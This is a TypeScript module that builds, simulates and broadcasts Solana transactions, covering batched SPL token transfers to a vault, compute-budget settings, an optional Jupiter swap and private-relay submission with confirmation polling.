// @ts-nocheck
/**
 * Solana settlement enhancements — batch SPL, compute budget, Jito simulation, Jupiter swap flash.
 */
import {
  ComputeBudgetProgram,
  Connection,
  PublicKey,
  TransactionInstruction,
  TransactionMessage,
  VersionedTransaction,
} from '@solana/web3.js'

import { resolveInstitutionalSolanaRpcUrl } from '../adapters/svm-adapter.js'
import { isMevProtectEnabled, submitPrivateSolanaTransaction } from '../mev-relay.js'
import { pollSolanaConfirmation } from './tx-confirmation-poller.js'

const TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA')
const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1RV')

export type SplBatchTransferLeg = {
  mint: string
  amount: bigint
}

export type SolanaComputeBudget = {
  computeUnitLimit: number
  computeUnitPriceMicroLamports: number
}

function deriveAta(owner: PublicKey, mint: PublicKey): PublicKey {
  const [ata] = PublicKey.findProgramAddressSync(
    [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
    ASSOCIATED_TOKEN_PROGRAM_ID,
  )
  return ata
}

function createSplTransferInstruction(
  source: PublicKey,
  destination: PublicKey,
  owner: PublicKey,
  amount: bigint,
): TransactionInstruction {
  const data = Buffer.alloc(9)
  data.writeUInt8(3, 0)
  data.writeBigUInt64LE(amount, 1)
  return new TransactionInstruction({
    keys: [
      { pubkey: source, isSigner: false, isWritable: true },
      { pubkey: destination, isSigner: false, isWritable: true },
      { pubkey: owner, isSigner: true, isWritable: false },
    ],
    programId: TOKEN_PROGRAM_ID,
    data,
  })
}

/** Resolve dynamic compute budget from env or instruction-count heuristic. */
export function resolveSolanaComputeBudget(instructionCount: number): SolanaComputeBudget {
  const limitRaw = process.env['COMPUTE_UNIT_LIMIT']?.trim()
  const priceRaw = process.env['COMPUTE_UNIT_PRICE']?.trim()

  const baseLimit = 25_000 + instructionCount * 18_000
  const computeUnitLimit = limitRaw && /^\d+$/.test(limitRaw) ? Number(limitRaw) : Math.min(baseLimit, 1_400_000)

  let computeUnitPriceMicroLamports = 5_000
  if (priceRaw && /^\d+$/.test(priceRaw)) {
    computeUnitPriceMicroLamports = Number(priceRaw)
  } else if (isMevProtectEnabled()) {
    computeUnitPriceMicroLamports = 50_000
  }

  return { computeUnitLimit, computeUnitPriceMicroLamports }
}

export function buildComputeBudgetInstructions(budget: SolanaComputeBudget): TransactionInstruction[] {
  return [
    ComputeBudgetProgram.setComputeUnitLimit({ units: budget.computeUnitLimit }),
    ComputeBudgetProgram.setComputeUnitPrice({ microLamports: budget.computeUnitPriceMicroLamports }),
  ]
}

export function isSolanaSwapFlashEnabled(): boolean {
  const v = process.env['SOLANA_SWAP_FLASH']?.trim().toLowerCase()
  return v === 'true' || v === '1' || v === 'yes'
}

/**
 * Build unsigned batch SPL transfer (multiple mints in one VersionedTransaction).
 */
export async function buildBatchSplTransaction(params: {
  wallet: string
  vault: string
  transfers: SplBatchTransferLeg[]
  rpcUrl?: string
  includeJupiterSwap?: boolean
}): Promise<{
  unsignedWireBase64: string
  recentBlockhash: string
  mints: string[]
  computeBudget: SolanaComputeBudget
}> {
  const legs = params.transfers.filter((t) => t.amount > 0n)
  if (legs.length === 0) {
    throw new Error('buildBatchSplTransaction requires at least one positive transfer')
  }

  const rpc = params.rpcUrl?.trim() || resolveInstitutionalSolanaRpcUrl()
  if (!rpc) throw new Error('RPC_SOLANA_PRIVATE / SOLANA_RPC_URL required')

  const owner = new PublicKey(params.wallet)
  const vaultOwner = new PublicKey(params.vault)
  const connection = new Connection(rpc, { commitment: 'confirmed' })
  const { blockhash } = await connection.getLatestBlockhash('finalized')

  const instructions: TransactionInstruction[] = []
  const budget = resolveSolanaComputeBudget(legs.length + (params.includeJupiterSwap ? 4 : 0))
  instructions.push(...buildComputeBudgetInstructions(budget))

  for (const leg of legs) {
    const mint = new PublicKey(leg.mint)
    const sourceAta = deriveAta(owner, mint)
    const destinationAta = deriveAta(vaultOwner, mint)
    instructions.push(createSplTransferInstruction(sourceAta, destinationAta, owner, leg.amount))
  }

  if (params.includeJupiterSwap && isSolanaSwapFlashEnabled() && legs.length === 1) {
    const swapIx = await fetchJupiterSwapInstructions({
      owner: params.wallet,
      inputMint: legs[0]!.mint,
      amount: legs[0]!.amount,
    })
    instructions.push(...swapIx)
  }

  const message = new TransactionMessage({
    payerKey: owner,
    recentBlockhash: blockhash,
    instructions,
  }).compileToV0Message()

  const unsigned = new VersionedTransaction(message)
  return {
    unsignedWireBase64: Buffer.from(unsigned.serialize()).toString('base64'),
    recentBlockhash: blockhash,
    mints: legs.map((l) => l.mint),
    computeBudget: budget,
  }
}

async function fetchJupiterSwapInstructions(params: {
  owner: string
  inputMint: string
  amount: bigint
}): Promise<TransactionInstruction[]> {
  const quoteUrl = new URL('https://quote-api.jup.ag/v6/quote')
  quoteUrl.searchParams.set('inputMint', params.inputMint)
  quoteUrl.searchParams.set('outputMint', 'So11111111111111111111111111111111111111112')
  quoteUrl.searchParams.set('amount', params.amount.toString())
  quoteUrl.searchParams.set('slippageBps', '100')

  const quoteRes = await fetch(quoteUrl.toString(), { signal: AbortSignal.timeout(20_000) })
  if (!quoteRes.ok) {
    throw new Error(`Jupiter quote failed: ${quoteRes.status}`)
  }
  const quoteResponse = await quoteRes.json()

  const swapRes = await fetch('https://quote-api.jup.ag/v6/swap', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      quoteResponse,
      userPublicKey: params.owner,
      wrapAndUnwrapSol: true,
      dynamicComputeUnitLimit: true,
    }),
    signal: AbortSignal.timeout(30_000),
  })
  if (!swapRes.ok) {
    throw new Error(`Jupiter swap build failed: ${swapRes.status}`)
  }
  const swapJson = (await swapRes.json()) as { swapTransaction?: string }
  if (!swapJson.swapTransaction) throw new Error('Jupiter swapTransaction missing')

  const tx = VersionedTransaction.deserialize(Buffer.from(swapJson.swapTransaction, 'base64'))
  const decompiled = TransactionMessage.decompile(tx.message)
  return decompiled.instructions.filter(
    (ix) => !ix.programId.equals(ComputeBudgetProgram.programId),
  )
}

/** Simulate signed or unsigned Solana wire before broadcast. */
export async function simulateSolanaTransactionWire(params: {
  wireBase64: string
  rpcUrl?: string
}): Promise<{ ok: boolean; detail?: string; unitsConsumed?: number }> {
  const rpc = params.rpcUrl?.trim() || resolveInstitutionalSolanaRpcUrl()
  if (!rpc) return { ok: false, detail: 'Solana RPC unavailable' }

  try {
    const connection = new Connection(rpc, { commitment: 'confirmed' })
    const bytes = Buffer.from(params.wireBase64, 'base64')
    const tx = VersionedTransaction.deserialize(bytes)
    const sim = await connection.simulateTransaction(tx, {
      sigVerify: tx.signatures.some((s) => s.some((b) => b !== 0)),
      commitment: 'confirmed',
    })
    if (sim.value.err != null) {
      return {
        ok: false,
        detail: `Solana simulation fault: ${JSON.stringify(sim.value.err)}`,
        unitsConsumed: sim.value.unitsConsumed ?? undefined,
      }
    }
    return { ok: true, unitsConsumed: sim.value.unitsConsumed ?? undefined }
  } catch (e) {
    return { ok: false, detail: e instanceof Error ? e.message : String(e) }
  }
}

/**
 * Broadcast with optional Jito path: simulate first, then private bundle or public RPC.
 */
export async function broadcastSolanaWithSimulation(params: {
  signedWireBase64: string
  rpcUrl?: string
  skipSimulation?: boolean
}): Promise<{ ok: boolean; tx_hash?: string; detail?: string }> {
  if (!params.skipSimulation) {
    const sim = await simulateSolanaTransactionWire({ wireBase64: params.signedWireBase64, rpcUrl: params.rpcUrl })
    if (!sim.ok) return { ok: false, detail: sim.detail ?? 'Solana preflight simulation failed' }
  }

  try {
    const txHash = await submitPrivateSolanaTransaction(params.signedWireBase64)
    const rpc = params.rpcUrl?.trim() || resolveInstitutionalSolanaRpcUrl()
    if (rpc) {
      const connection = new Connection(rpc, { commitment: 'confirmed' })
      // HTTP polling — no WebSocket leak (confirmTransaction() → FATAL unhandledRejection)
      const _enhPoll = await pollSolanaConfirmation(txHash, rpc, { intervalMs: 2_000, timeoutMs: 30_000 })
      if (_enhPoll.status === 'failed') {
        return { ok: false, detail: `SOL confirmation fault: ${_enhPoll.detail}` }
      }
    }
    return { ok: true, tx_hash: txHash }
  } catch (e) {
    return { ok: false, detail: e instanceof Error ? e.message : String(e) }
  }
}
